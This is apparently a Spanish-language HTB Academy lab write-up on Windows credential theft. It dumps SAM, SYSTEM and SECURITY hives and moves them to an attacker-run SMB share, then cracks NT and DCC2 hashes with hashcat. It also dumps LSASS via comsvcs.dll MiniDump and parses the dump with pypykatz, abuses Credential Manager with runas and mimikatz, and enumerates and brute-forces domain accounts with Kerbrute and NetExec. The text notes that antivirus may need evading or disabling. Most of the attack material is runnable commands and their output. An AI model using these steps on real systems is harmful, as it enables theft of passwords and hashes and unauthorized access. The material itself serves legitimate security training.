---
tags:
  - Windows
  - Post-Explotacion
  - Contraseñas
---


#  Ataque a SAM, SYSTEM, SECURITY

### Copia de los registros

Mediante el lanzamiento `cmd.exe` Con privilegios administrativos, podemos utilizar `reg.exe` para guardar copias de las colmenas de registro. Ejecute los siguientes comandos:

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```


### Creacion de recurso compartido smbserver

Para crear el recurso compartido, simplemente ejecutamos `smbserver.py -smb2support`, especifique un nombre para el recurso compartido (por ejemplo, `CompData`), y apunte al directorio local en nuestro host de ataque donde se almacenarán las copias de la colmena (por ejemplo, `/home/ltnbob/Documents`). El `-smb2support` flag garantiza la compatibilidad con versiones más nuevas de SMB. Si no incluimos este indicador, es posible que los sistemas Windows más nuevos no puedan conectarse al recurso compartido, ya que SMBv1 está deshabilitado de forma predeterminada debido a [Numerosas vulnerabilidades graves](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) y exploits disponibles públicamente.

```shell-session
vcrdcr@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```


### Mover copias de Hive para compartir

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```


### Volcado de hashes con secretsdump

```shell-session
vcrdcr@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```

Aquí vemos que `secretsdump` abandonó con éxito el `local` Hashes SAM, junto con datos de `hklm\security`, incluida información de inicio de sesión de dominio almacenada en caché y secretos LSA, como la máquina y las claves de usuario para DPAPI.

Observe que el primer paso `secretsdump` realiza la recuperación del `system bootkey` antes de proceder a tirar el `local SAM hashes`. Esto es necesario porque la clave de arranque se utiliza para cifrar y descifrar la base de datos SAM. Sin él, los hashes no se pueden descifrar —, por lo que es crucial tener copias de las colmenas de registro relevantes, como se mencionó anteriormente.


### Descifrando hashes con Hashcat

Podemos completar un archivo de texto con los hashes NT que pudimos volcar.

```shell-session
vcrdcr@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```


### Ejecución de Hashcat contra hashes NT

Hashcat admite muchos modos diferentes y seleccionar el correcto depende en gran medida del tipo de ataque y del tipo de hash específico que queremos descifrar. Cubrir todos los modos disponibles está más allá del alcance de este módulo, por lo que nos centraremos en utilizar el `-m` Opción para especificar el tipo de hash `1000`, que corresponde a hashes NT (también conocidos como hashes basados en NTLM). Para obtener una lista completa de los tipos de hash admitidos y sus números de modo asociados, podemos consultar Hashcat [página wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) o consulte la página del manual.

```shell-session
vcrdcr@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

>Tenga en cuenta que esta es una técnica bien conocida y es posible que los administradores hayan implementado medidas de seguridad para detectarla o prevenirla. Existen varias estrategias de detección y mitigación [documentado](https://attack.mitre.org/techniques/T1003/002/) dentro del marco MITRE ATT&CK.



### Hashes DCC2

Como se mencionó anteriormente, `hklm\security` contiene información de inicio de sesión de dominio almacenada en caché, específicamente en forma de hashes DCC2. Se trata de copias locales y en hash de hashes de credenciales de red. Un ejemplo es:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

Este tipo de hash es mucho más difícil de descifrar que un hash NT, ya que utiliza PBKDF2. Además, no se puede utilizar para movimiento lateral con técnicas como Pass-the-Hash (que cubriremos más adelante). El modo Hashcat para descifrar hashes DCC2 es `2100`.


```shell-session
vcrdcr@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 2100 (Domain Cached Credentials 2 (DCC2), MS Cache 2)
Hash.Target......: $DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
Time.Started.....: Tue Apr 22 09:12:53 2025 (27 secs)
Time.Estimated...: Tue Apr 22 09:13:20 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5536 H/s (8.70ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 149504/14344385 (1.04%)
Rejected.........: 0/149504 (0.00%)
Restore.Point....: 148992/14344385 (1.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9216-10239
Candidate.Engine.: Device Generator
Candidates.#1....: ilovelloyd -> gerber1
Hardware.Mon.#1..: Util: 95%

Started: Tue Apr 22 09:12:33 2025
Stopped: Tue Apr 22 09:13:22 2025
```


## Remote dumping & LSA secrets considerations

#### Volcar secretos de LSA de forma remota

  Ataque a SAM, SISTEMA y SEGURIDAD

```shell-session
vcrdcr@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

#### Volcado de SAM de forma remota

De manera similar, podemos usar netexec para volcar hashes de la base de datos SAM de forma remota.

  Ataque a SAM, SISTEMA y SEGURIDAD

```shell-session
vcrdcr@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```



# Ataque a  LSASS

### Volcado de memoria de proceso LSASS

Tenemos que hacer una copia al alchivo de lsass. Podemos hacerlo de dos formas.

#### Método del administrador de tareas (UI)

Con acceso a una sesión gráfica interactiva en el destino, podemos usar el administrador de tareas para crear un volcado de memoria. Esto requiere que:

1. Abierto `Task Manager`
2. Seleccione el `Processes` tab
3. Busque y haga clic derecho en `Local Security Authority Process`
4. Seleccionar `Create dump file`


#### Método Rundll32.exe y Comsvcs.dll (CMD)

Antes de emitir el comando para crear el archivo de volcado, debemos determinar qué ID de proceso (`PID`) está asignado a `lsass.exe`. Esto se puede hacer desde cmd o PowerShell:


##### Cómo encontrar el PID de LSASS en cmd

Desde cmd, podemos emitir el comando `tasklist /svc` encontrar `lsass.exe` y su ID de proceso.

```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```


##### Cómo encontrar el PID de LSASS en PowerShell

Desde PowerShell, podemos emitir el comando `Get-Process lsass` y vea el ID del proceso en el `Id` campo.

```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Una vez que tengamos el PID asignado al proceso LSASS, podemos crear un archivo de volcado.


**Creación de un archivo de volcado mediante PowerShell

Con una sesión elevada de PowerShell, podemos emitir el siguiente comando para crear un archivo de volcado:

  Atacando a LSASS

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Con este comando, estamos ejecutando `rundll32.exe` para llamar a una función exportada de `comsvcs.dll` que también llama MiniDumpWriteDump (`MiniDump`) función para volcar la memoria del proceso LSASS a un directorio específico (`C:\lsass.dmp`). Recuerde que la mayoría de las herramientas AV modernas reconocen esto como actividad maliciosa e impiden que se ejecute el comando. En estos casos, necesitaremos considerar formas de eludir o deshabilitar la herramienta AV a la que nos enfrentamos.

Si logramos ejecutar este comando y generar el `lsass.dmp` archivo, podemos proceder a transferir el archivo a nuestro cuadro de ataque para intentar extraer cualquier credencial que pueda haber sido almacenada en la memoria del proceso LSASS.

>**Nota:** Podemos utilizar el método de transferencia de archivos analizado en la sección Atacar SAM para obtener el archivo lsass.dmp desde el objetivo a nuestro host de ataque.

### Uso de Pypykatz para extraer credenciales

#### Corriendo Pypykatz

El comando inicia el uso de `pypykatz` para analizar los secretos ocultos en el volcado de memoria del proceso LSASS. Nosotros usamos `lsa` en el comando porque LSASS es un subsistema del `Local Security Authority`, luego especificamos la fuente de datos como `minidump` archivo, procedido por la ruta al archivo de volcado almacenado en nuestro host de ataque. Pypykatz analiza el archivo de volcado y genera los resultados:

```shell-session
vcrdcr@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```


#### MSV

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) es un paquete de autenticación en Windows al que LSA llama para validar los intentos de inicio de sesión en la base de datos SAM. Pypykatz extrajo el `SID`, `Username`, `Domain`, e incluso el `NT` & `SHA1` hashes de contraseñas asociados con la sesión de inicio de sesión de la cuenta de usuario bob almacenados en la memoria del proceso LSASS. Esto resultará útil en el siguiente paso de nuestro ataque que cubriremos al final de esta sección.

#### WDIGEST

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST` es un protocolo de autenticación más antiguo habilitado de forma predeterminada en `Windows XP` - `Windows 8` y `Windows Server 2003` - `Windows Server 2012`. LSASS almacena en caché las credenciales utilizadas por WDIGEST en texto claro. Esto significa que si nos encontramos apuntando a un sistema Windows con WDIGEST habilitado, lo más probable es que veamos una contraseña en texto claro. Los sistemas operativos Windows modernos tienen WDIGEST deshabilitado de forma predeterminada. Además, es fundamental tener en cuenta que Microsoft lanzó una actualización de seguridad para los sistemas afectados por este problema con WDIGEST. Podemos estudiar los detalles de esa actualización de seguridad [aquí](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/).

#### Kerberos

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) es un protocolo de autenticación de red utilizado por Active Directory en entornos de dominio de Windows. A las cuentas de usuario de dominio se les otorgan tickets tras la autenticación con Active Directory. Este ticket se utiliza para permitir al usuario acceder a recursos compartidos en la red a los que se le ha concedido acceso sin necesidad de escribir sus credenciales cada vez. Cachés LSASS `passwords`, `ekeys`, `tickets`, y `pins` asociado con Kerberos. Es posible extraerlos de la memoria del proceso LSASS y utilizarlos para acceder a otros sistemas unidos al mismo dominio.

#### DPAPI

```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz y Pypykatz pueden extraer el DPAPI `masterkey` para usuarios conectados cuyos datos están presentes en la memoria del proceso LSASS. Estas claves maestras se pueden utilizar luego para descifrar los secretos asociados con cada una de las aplicaciones utilizando DPAPI y dar como resultado la captura de credenciales para varias cuentas. Las técnicas de ataque DPAPI se tratan con mayor detalle en el [Escalada de privilegios de Windows](https://academy.hackthebox.com/module/details/67) módulo.

nthash

```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```


# Ataque al Administrador de credenciales de Windows

[Administrador de credenciales](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication#windows-vault-and-credential-manager) es una característica integrada en Windows desde entonces `Server 2008 R2` y `Windows 7`. La documentación exhaustiva sobre cómo funciona no está disponible públicamente, pero esencialmente permite a los usuarios y aplicaciones almacenar de forma segura credenciales relevantes para otros sistemas y sitios web. Las credenciales se almacenan en carpetas cifradas especiales en la computadora bajo los perfiles de usuario y sistema ([MITRE ATT&CK](https://attack.mitre.org/techniques/T1555/004/)):

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`


Cada carpeta de bóveda contiene un `Policy.vpol` archivo con claves AES (AES-128 o AES-256) que está protegido por DPAPI. Estas claves AES se utilizan para cifrar las credenciales. Las versiones más nuevas de Windows utilizan `Credential Guard` para proteger aún más las claves maestras DPAPI almacenándolas en enclaves de memoria seguros ([Seguridad basada en virtualización](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

|Nombre|Descripción|
|---|---|
|Credenciales web|Credenciales asociadas a sitios web y cuentas en línea. Este casillero es utilizado por Internet Explorer y versiones heredadas de Microsoft Edge.|
|Credenciales de Windows|Se utiliza para almacenar tokens de inicio de sesión para diversos servicios, como OneDrive, y credenciales relacionadas con usuarios del dominio, recursos de red local, servicios y directorios compartidos.|

Es posible exportar Windows Vaults a `.crd` archivos ya sea a través del Panel de control o con el siguiente comando. Las copias de seguridad creadas de esta manera se cifran con una contraseña proporcionada por el usuario y se pueden importar en otros sistemas Windows.

```cmd-session
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```


### Enumeración de credenciales con cmdkey

Podemos usar [clave de cmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) para enumerar las credenciales almacenadas en el perfil del usuario actual:

```cmd-session
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```


|Clave|Valor|
|---|---|
|Objetivo|El recurso o nombre de cuenta para el que sirve la credencial. Podría ser una computadora, un nombre de dominio o un identificador especial.|
|Tipo|El tipo de credencial. Los tipos comunes son `Generic` para credenciales generales, y `Domain Password` para inicios de sesión de usuarios del dominio.|
|Usuario|La cuenta de usuario asociada a la credencial.|
|Persistencia|Algunas credenciales indican si una credencial se guarda de forma persistente en la computadora; credenciales marcadas con `Local machine persistence` sobrevivir a los reinicios.|

La primera credencial en la salida del comando anterior, `virtualapp/didlogical`, es una credencial genérica utilizada por los servicios de cuenta Microsoft/Windows Live. El nombre de usuario de aspecto aleatorio es un ID de cuenta interno. Esta entrada puede ignorarse para nuestros propósitos.

**La segunda credencial**, `Domain:interactive=SRV01\mcharles`, es una credencial de dominio asociada con el usuario SRV01\mcharles. `Interactive` significa que la credencial se utiliza para sesiones de inicio de sesión interactivas. Siempre que nos encontremos con este tipo de credencial, podemos usarla `runas` para hacerse pasar por el usuario almacenado de la siguiente manera:

```cmd-session
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

![Mensaje de comando que muestra información del usuario y detalles del dominio. Comando "whoami" ejecutado, mostrando "srv01\mcharles".](https://academy.hackthebox.com/storage/modules/308/img/CredMan_3.png)


### Extracción de credenciales con Mimikatz

Hay muchas herramientas diferentes que se pueden utilizar para descifrar credenciales almacenadas. Una de las herramientas que podemos utilizar es [mimikatz](https://github.com/gentilkiwi/mimikatz). Incluso dentro `mimikatz`Hay varias formas de atacar estas credenciales: podemos volcarlas de la memoria usando el `sekurlsa` módulo, o podemos descifrar manualmente las credenciales usando el `dpapi` módulo. Para este ejemplo, apuntaremos al proceso LSASS con `sekurlsa`:

```cmd-session
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

...SNIP...
```

>**Nota:** Se incluyen algunas otras herramientas que pueden usarse para enumerar y extraer credenciales almacenadas [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [La Zagne](https://github.com/AlessandroZ/LaZagne), y [DonPAPI](https://github.com/login-securite/DonPAPI).


# Ataque a Active Directory y NTDS.dit

### Ataques de diccionario contra cuentas AD usando NetExec

#### Creación de una lista personalizada de nombres de usuario

|Convención de nombres de usuario|Ejemplo práctico para `Jane Jill Doe`|
|---|---|
|`firstinitiallastname`|jdoe|
|`firstinitialmiddleinitiallastname`|jjdoe|
|`firstnamelastname`|janedoe|
|`firstname.lastname`|jane.doe|
|`lastname.firstname`|doe.jane|
|`nickname`|doedoehacksstuff|

A menudo, la estructura de una dirección de correo electrónico nos dará el nombre de usuario del empleado (estructura: `username@domain`). Por ejemplo, desde la dirección de correo electrónico `jdoe`@`inlanefreight.com`, podemos inferir que `jdoe` es el nombre de usuario.

---

Podemos crear manualmente nuestra(s) lista(s) o utilizar una `automated list generator` como la herramienta basada en Ruby [Anarquía de nombres de usuario](https://github.com/urbanadventurer/username-anarchy) para convertir una lista de nombres reales en formatos de nombre de usuario comunes. Una vez que la herramienta haya sido clonada en nuestro host de ataque local usando `Git`, podemos ejecutarlo contra una lista de nombres reales como se muestra en el resultado del ejemplo a continuación:

```shell-session
vcrdcr@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
...
```


#### Enumeración de nombres de usuario válidos con Kerbrute

Antes de comenzar a adivinar contraseñas para nombres de usuario que tal vez ni siquiera existan, puede que valga la pena identificar la convención de nomenclatura correcta y confirmar la validez de algunos nombres de usuario. Podemos hacer esto con una herramienta como [Kerbrute](https://github.com/ropnop/kerbrute). Kerbrute se puede utilizar para fuerza bruta, pulverización de contraseñas y enumeración de nombres de usuario. En este momento, solo nos interesa la enumeración de nombres de usuario, que se vería así:

```shell-session
vcrdcr@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```


#### Lanzar un ataque de fuerza bruta con NetExec

Una vez que tengamos nuestra(s) lista(s) preparadas o descubramos la convención de nomenclatura y algunos nombres de empleados, podemos lanzar un ataque de fuerza bruta contra el controlador de dominio de destino utilizando una herramienta como NetExec. Podemos usarlo junto con el protocolo SMB para enviar solicitudes de inicio de sesión al controlador de dominio de destino. Aquí está el comando para hacerlo:

```shell-session
vcrdcr@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
